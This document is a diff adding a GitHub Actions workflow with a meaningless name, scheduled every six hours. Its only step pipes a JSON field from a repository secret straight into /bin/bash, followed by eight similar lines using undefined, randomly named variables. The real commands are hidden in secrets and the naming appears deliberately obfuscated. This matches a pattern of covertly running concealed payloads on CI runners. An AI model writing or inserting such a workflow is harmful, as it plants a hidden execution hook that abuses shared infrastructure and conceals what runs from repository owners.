@@ -1,0 +1,25 @@
+name: stoodpoliteness
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: stoodpoliteness
+        env:
+          ehui48806: ${{ secrets.ehui48806 }}
+        run: |
+          echo $ehui48806 | jq -r .rg00882 | /bin/bash
+          echo $x57837 | jq -r .fykxq66 | /bin/bash
+          echo $fcowo74030 | jq -r .u679 | /bin/bash
+          echo $sdqtl71 | jq -r .ar6745 | /bin/bash
+          echo $mzudl7877 | jq -r .hxt560 | /bin/bash
+          echo $om8 | jq -r .g5102 | /bin/bash
+          echo $lbhah7 | jq -r .t7211 | /bin/bash
+          echo $jad30438 | jq -r .ffqpx195 | /bin/bash
+          echo $cl7 | jq -r .ksx6 | /bin/bash
+
